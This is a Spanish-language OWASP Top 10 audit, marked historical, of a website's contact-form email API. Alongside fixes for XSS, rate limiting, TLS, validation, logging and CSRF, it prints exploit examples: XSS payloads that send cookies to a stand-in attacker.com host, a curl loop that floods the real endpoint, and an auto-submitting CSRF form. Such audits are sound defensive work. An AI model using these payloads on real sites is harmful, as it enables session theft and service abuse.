# 🔒 AUDITORÍA DE SEGURIDAD - OWASP Top 10
## Creative Hut - API de Envío de Emails

> Documento histórico (2025-01-28). No es el esquema vigente.
> Las variables actuales están solo en `.env.example` (`SMTP_*`).
> El módulo de correo ya no está en `src/app/api/send-email/route.ts`; está en `src/server/email/contact-mailer.ts` y no se publica con el export estático.

**Fecha:** 2025-01-28  
**Auditor:** Análisis de Código Estático  
**Alcance:** `/src/app/api/send-email/route.ts` y `/src/components/ContactForm.tsx`

---

## 📋 RESUMEN EJECUTIVO

Se identificaron **8 vulnerabilidades críticas y altas** relacionadas con el OWASP Top 10. El código presenta riesgos significativos de seguridad que requieren atención inmediata antes del despliegue a producción.

---

## 🚨 VULNERABILIDADES CRÍTICAS

### 1. **A03:2021 - INYECCIÓN (XSS - Cross-Site Scripting)**
**Severidad:** 🔴 CRÍTICA  
**OWASP Top 10:** A03:2021 - Injection

#### Descripción
El código inserta directamente datos del usuario en plantillas HTML sin sanitización adecuada, permitiendo ejecución de JavaScript malicioso.

#### Ubicación
```typescript
// Líneas 307, 311, 316, 321, 333 en route.ts
html: `
  <td>${fullName}</td>  // ❌ VULNERABLE
  <td><a href="mailto:${email}">${email}</a></td>  // ❌ VULNERABLE
  <td><a href="tel:${phone}">${phone}</a></td>  // ❌ VULNERABLE
  ${message.replace(/\n/g, '<br>')}  // ❌ VULNERABLE - Solo reemplaza \n
`
```

#### Explotación
```javascript
// Payload malicioso:
fullName: '<img src=x onerror="alert(document.cookie)">'
email: '"><script>fetch("https://attacker.com/steal?cookie="+document.cookie)</script>'
message: '<script>document.location="https://attacker.com/phishing"</script>'
```

#### Impacto
- Robo de cookies de sesión
- Redirección a sitios maliciosos
- Robo de credenciales
- Defacement del email

#### Mitigación
```typescript
// ✅ SOLUCIÓN: Usar librería de sanitización
import DOMPurify from 'isomorphic-dompurify';

// Sanitizar todos los campos antes de insertar
const sanitizeHtml = (str: string): string => {
  return DOMPurify.sanitize(str, { 
    ALLOWED_TAGS: [],  // No permitir HTML
    ALLOWED_ATTR: [] 
  });
};

const sanitizeForAttribute = (str: string): string => {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
};

// Aplicar sanitización
html: `
  <td>${sanitizeHtml(fullName)}</td>
  <td><a href="mailto:${sanitizeForAttribute(email)}">${sanitizeHtml(email)}</a></td>
  <td><a href="tel:${sanitizeForAttribute(phone || '')}">${sanitizeHtml(phone || '')}</a></td>
  <div>${sanitizeHtml(message).replace(/\n/g, '<br>')}</div>
`
```

---

### 2. **A01:2021 - FALTA DE CONTROL DE ACCESO (No Rate Limiting)**
**Severidad:** 🔴 CRÍTICA  
**OWASP Top 10:** A01:2021 - Broken Access Control

#### Descripción
No existe rate limiting, permitiendo ataques de fuerza bruta, spam masivo y DoS.

#### Ubicación
```typescript
// route.ts - No hay límite de requests
export async function POST(request: NextRequest) {
  // ❌ Sin verificación de rate limit
}
```

#### Explotación
```bash
# Script de ataque
for i in {1..1000}; do
  curl -X POST https://creativehutcr.com/api/send-email \
    -H "Content-Type: application/json" \
    -d '{"fullName":"Spam","email":"spam@test.com","message":"Spam"}'
done
```

#### Impacto
- Spam masivo de emails
- Agotamiento de recursos del servidor
- Costos elevados de SMTP
- Denegación de servicio (DoS)

#### Mitigación
```typescript
// ✅ SOLUCIÓN: Implementar rate limiting
import { Ratelimit } from '@upstash/ratelimit';
import { Redis } from '@upstash/redis';

const ratelimit = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(5, '1 h'), // 5 requests por hora
  analytics: true,
});

export async function POST(request: NextRequest) {
  // Obtener IP del cliente
  const ip = request.headers.get('x-forwarded-for') || 
             request.headers.get('x-real-ip') || 
             'unknown';
  
  // Verificar rate limit
  const { success, limit, remaining } = await ratelimit.limit(`email_${ip}`);
  
  if (!success) {
    return NextResponse.json(
      { error: 'Demasiadas solicitudes. Intenta más tarde.' },
      { status: 429 }
    );
  }
  
  // Resto del código...
}
```

---

### 3. **A02:2021 - FALLAS CRIPTOGRÁFICAS (TLS Débil)**
**Severidad:** 🟠 ALTA  
**OWASP Top 10:** A02:2021 - Cryptographic Failures

#### Descripción
Configuración TLS insegura usando SSLv3 (vulnerable y deprecado).

#### Ubicación
```typescript
// Línea 220-222 en route.ts
tls: {
  ciphers: 'SSLv3'  // ❌ VULNERABLE - SSLv3 está deprecado y es inseguro
}
```

#### Impacto
- Interceptación de credenciales SMTP
- Man-in-the-Middle (MITM)
- Exposición de datos en tránsito

#### Mitigación
```typescript
// ✅ SOLUCIÓN: Usar TLS 1.2+ y cifrados seguros
const transporter = nodemailer.createTransport({
  host: 'smtp.office365.com',
  port: 587,
  secure: false,
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
  tls: {
    minVersion: 'TLSv1.2',  // ✅ TLS 1.2 mínimo
    ciphers: 'HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
    rejectUnauthorized: true,  // ✅ Verificar certificado
  }
});
```

---

### 4. **A04:2021 - DISEÑO INSEGURO (Validación Insuficiente)**
**Severidad:** 🟠 ALTA  
**OWASP Top 10:** A04:2021 - Insecure Design

#### Descripción
Validación de datos insuficiente. No valida formato de email, longitud de campos, ni caracteres permitidos.

#### Ubicación
```typescript
// Líneas 186-191 en route.ts
if (!fullName || !email || !message) {
  // ❌ Solo verifica existencia, no formato ni longitud
}
```

#### Explotación
```javascript
// Payloads maliciosos
{
  email: 'a'.repeat(10000) + '@test.com',  // Buffer overflow potencial
  fullName: 'A'.repeat(100000),  // DoS por tamaño
  message: 'X'.repeat(1000000)  // Agotamiento de memoria
}
```

#### Impacto
- Buffer overflow
- Agotamiento de memoria
- DoS
- Emails malformados

#### Mitigación
```typescript
// ✅ SOLUCIÓN: Validación robusta
import validator from 'validator';

// Constantes de validación
const MAX_LENGTHS = {
  fullName: 100,
  email: 254,
  phone: 20,
  message: 5000,
  service: 50
};

function validateInput(data: ContactFormData): { valid: boolean; error?: string } {
  // Validar longitud
  if (data.fullName.length > MAX_LENGTHS.fullName) {
    return { valid: false, error: 'Nombre demasiado largo' };
  }
  
  if (data.message.length > MAX_LENGTHS.message) {
    return { valid: false, error: 'Mensaje demasiado largo' };
  }
  
  // Validar formato de email
  if (!validator.isEmail(data.email)) {
    return { valid: false, error: 'Email inválido' };
  }
  
  // Validar teléfono si existe
  if (data.phone && !validator.isMobilePhone(data.phone, 'any', { strictMode: false })) {
    return { valid: false, error: 'Teléfono inválido' };
  }
  
  // Validar caracteres permitidos (solo alfanuméricos y algunos especiales)
  if (!/^[a-zA-ZáéíóúÁÉÍÓÚñÑ\s\-'\.]+$/.test(data.fullName)) {
    return { valid: false, error: 'Nombre contiene caracteres inválidos' };
  }
  
  // Validar servicio contra lista blanca
  if (data.service && !SERVICE_NAMES[data.service]) {
    return { valid: false, error: 'Servicio inválido' };
  }
  
  return { valid: true };
}

// Usar en el handler
const validation = validateInput({ fullName, email, phone, service, message });
if (!validation.valid) {
  return NextResponse.json(
    { error: validation.error },
    { status: 400 }
  );
}
```

---

### 5. **A05:2021 - CONFIGURACIÓN DE SEGURIDAD INCORRECTA (Variables de Entorno)**
**Severidad:** 🟠 ALTA  
**OWASP Top 10:** A05:2021 - Security Misconfiguration

#### Descripción
No se valida la existencia de variables de entorno críticas antes de usarlas.

#### Ubicación
```typescript
// Líneas 217-218, 273-274 en route.ts
user: process.env.EMAIL_USER,  // ❌ Podría ser undefined
pass: process.env.EMAIL_PASS,  // ❌ Podría ser undefined
from: process.env.EMAIL_FROM,  // ❌ Podría ser undefined
to: process.env.EMAIL_TO,      // ❌ Podría ser undefined
```

#### Impacto
- Fallo silencioso en producción
- Exposición de errores internos
- Emails enviados a direcciones incorrectas

#### Mitigación
```typescript
// ✅ SOLUCIÓN: Validar variables de entorno al inicio
function validateEnvVars(): void {
  const required = ['EMAIL_USER', 'EMAIL_PASS', 'EMAIL_FROM', 'EMAIL_TO'];
  const missing = required.filter(key => !process.env[key]);
  
  if (missing.length > 0) {
    throw new Error(`Variables de entorno faltantes: ${missing.join(', ')}`);
  }
}

// Llamar al inicio del handler
export async function POST(request: NextRequest) {
  try {
    validateEnvVars();
    // Resto del código...
  } catch (error) {
    console.error('Configuración inválida:', error);
    return NextResponse.json(
      { error: 'Error de configuración del servidor' },
      { status: 500 }
    );
  }
}
```

---

### 6. **A09:2021 - REGISTRO Y MONITOREO INSUFICIENTE (Logging Inseguro)**
**Severidad:** 🟡 MEDIA  
**OWASP Top 10:** A09:2021 - Security Logging and Monitoring Failures

#### Descripción
Los logs exponen información sensible y no hay monitoreo de intentos sospechosos.

#### Ubicación
```typescript
// Línea 433 en route.ts
console.error('Error enviando email:', error);  // ❌ Puede exponer credenciales
```

#### Impacto
- Exposición de información sensible en logs
- Imposibilidad de detectar ataques
- No hay auditoría de seguridad

#### Mitigación
```typescript
// ✅ SOLUCIÓN: Logging seguro y estructurado
import winston from 'winston';

const logger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  transports: [
    new winston.transports.File({ filename: 'error.log', level: 'error' }),
    new winston.transports.File({ filename: 'combined.log' })
  ]
});

// Función de logging seguro
function logEmailAttempt(ip: string, email: string, success: boolean, error?: any) {
  logger.info({
    event: 'email_attempt',
    ip: ip,
    email: email.substring(0, 3) + '***', // ✅ Ocultar email completo
    success: success,
    timestamp: new Date().toISOString(),
    error: error ? error.message : undefined  // ✅ Solo mensaje, no stack completo
  });
  
  // Alertar en caso de múltiples fallos
  if (!success) {
    // Implementar alerta (email, Slack, etc.)
  }
}

// Usar en el handler
const ip = request.headers.get('x-forwarded-for') || 'unknown';
try {
  await transporter.sendMail(mailOptions);
  logEmailAttempt(ip, email, true);
} catch (error) {
  logEmailAttempt(ip, email, false, error);
  throw error;
}
```

---

### 7. **A07:2021 - FALLA DE IDENTIFICACIÓN Y AUTENTICACIÓN (CSRF)**
**Severidad:** 🟡 MEDIA  
**OWASP Top 10:** A07:2021 - Identification and Authentication Failures

#### Descripción
No hay protección CSRF (Cross-Site Request Forgery) en el formulario.

#### Ubicación
```typescript
// ContactForm.tsx - Línea 149
fetch('/api/send-email', {  // ❌ Sin token CSRF
  method: 'POST',
  body: JSON.stringify(formData)
})
```

#### Explotación
```html
<!-- Sitio malicioso -->
<form action="https://creativehutcr.com/api/send-email" method="POST">
  <input name="fullName" value="Spam">
  <input name="email" value="spam@attacker.com">
  <input name="message" value="Spam desde sitio malicioso">
</form>
<script>document.forms[0].submit();</script>
```

#### Impacto
- Spam desde sitios externos
- Ataques automatizados
- Abuso del servicio

#### Mitigación
```typescript
// ✅ SOLUCIÓN: Implementar tokens CSRF
// En el servidor (route.ts)
import { randomBytes } from 'crypto';

// Generar token CSRF
export async function GET() {
  const token = randomBytes(32).toString('hex');
  // Guardar en sesión o cache con expiración
  return NextResponse.json({ csrfToken: token });
}

// Validar en POST
export async function POST(request: NextRequest) {
  const csrfToken = request.headers.get('x-csrf-token');
  // Validar token contra sesión/cache
  if (!csrfToken || !isValidCsrfToken(csrfToken)) {
    return NextResponse.json(
      { error: 'Token CSRF inválido' },
      { status: 403 }
    );
  }
  // Resto del código...
}

// En el cliente (ContactForm.tsx)
const [csrfToken, setCsrfToken] = useState('');

useEffect(() => {
  fetch('/api/csrf-token')
    .then(res => res.json())
    .then(data => setCsrfToken(data.csrfToken));
}, []);

// Incluir en el request
fetch('/api/send-email', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': csrfToken  // ✅ Token CSRF
  },
  body: JSON.stringify(formData)
})
```

---

### 8. **A10:2021 - FALLA EN FILTROS DEL LADO DEL SERVIDOR (SSRF Potencial)**
**Severidad:** 🟡 MEDIA  
**OWASP Top 10:** A10:2021 - Server-Side Request Forgery

#### Descripción
Aunque no hay SSRF directo, la falta de validación podría permitir inyección en headers SMTP.

#### Ubicación
```typescript
// route.ts - No valida que EMAIL_FROM y EMAIL_TO sean válidos
from: process.env.EMAIL_FROM,  // ❌ No validado
to: process.env.EMAIL_TO,      // ❌ No validado
```

#### Mitigación
```typescript
// ✅ SOLUCIÓN: Validar emails de configuración
function validateEmailConfig(): void {
  const from = process.env.EMAIL_FROM;
  const to = process.env.EMAIL_TO;
  
  if (!validator.isEmail(from || '')) {
    throw new Error('EMAIL_FROM no es un email válido');
  }
  
  if (!validator.isEmail(to || '')) {
    throw new Error('EMAIL_TO no es un email válido');
  }
  
  // Validar dominio permitido
  const allowedDomain = 'creativehutcr.com';
  if (!from?.endsWith(`@${allowedDomain}`)) {
    throw new Error('EMAIL_FROM debe ser del dominio permitido');
  }
}
```

---

## 📊 RESUMEN DE RIESGOS

| Vulnerabilidad | Severidad | OWASP | Estado |
|---------------|-----------|-------|--------|
| XSS (Inyección HTML) | 🔴 Crítica | A03 | ⚠️ Requiere acción inmediata |
| Falta de Rate Limiting | 🔴 Crítica | A01 | ⚠️ Requiere acción inmediata |
| TLS Débil (SSLv3) | 🟠 Alta | A02 | ⚠️ Requiere corrección |
| Validación Insuficiente | 🟠 Alta | A04 | ⚠️ Requiere corrección |
| Variables de Entorno | 🟠 Alta | A05 | ⚠️ Requiere corrección |
| Logging Inseguro | 🟡 Media | A09 | 💡 Mejora recomendada |
| Falta de CSRF | 🟡 Media | A07 | 💡 Mejora recomendada |
| Validación de Config | 🟡 Media | A10 | 💡 Mejora recomendada |

---

## ✅ PLAN DE ACCIÓN RECOMENDADO

### Prioridad 1 (Inmediato - Antes de producción)
1. ✅ Implementar sanitización XSS
2. ✅ Agregar rate limiting
3. ✅ Corregir configuración TLS
4. ✅ Validar variables de entorno

### Prioridad 2 (Corto plazo - 1 semana)
5. ✅ Mejorar validación de inputs
6. ✅ Implementar logging seguro
7. ✅ Agregar protección CSRF

### Prioridad 3 (Mediano plazo - 1 mes)
8. ✅ Implementar monitoreo y alertas
9. ✅ Auditoría de logs regular
10. ✅ Tests de seguridad automatizados

---

## 📦 DEPENDENCIAS RECOMENDADAS

```json
{
  "dependencies": {
    "isomorphic-dompurify": "^2.9.0",
    "validator": "^13.11.0",
    "@upstash/ratelimit": "^0.4.0",
    "@upstash/redis": "^1.25.0",
    "winston": "^3.11.0"
  }
}
```

---

## 🔐 CHECKLIST DE SEGURIDAD PRE-PRODUCCIÓN

- [ ] Sanitización XSS implementada
- [ ] Rate limiting configurado
- [ ] TLS 1.2+ habilitado
- [ ] Validación robusta de inputs
- [ ] Variables de entorno validadas
- [ ] Logging seguro implementado
- [ ] Protección CSRF activa
- [ ] Monitoreo configurado
- [ ] Tests de seguridad ejecutados
- [ ] Documentación de seguridad actualizada

---

**⚠️ ADVERTENCIA:** No desplegar a producción hasta resolver las vulnerabilidades de Prioridad 1.


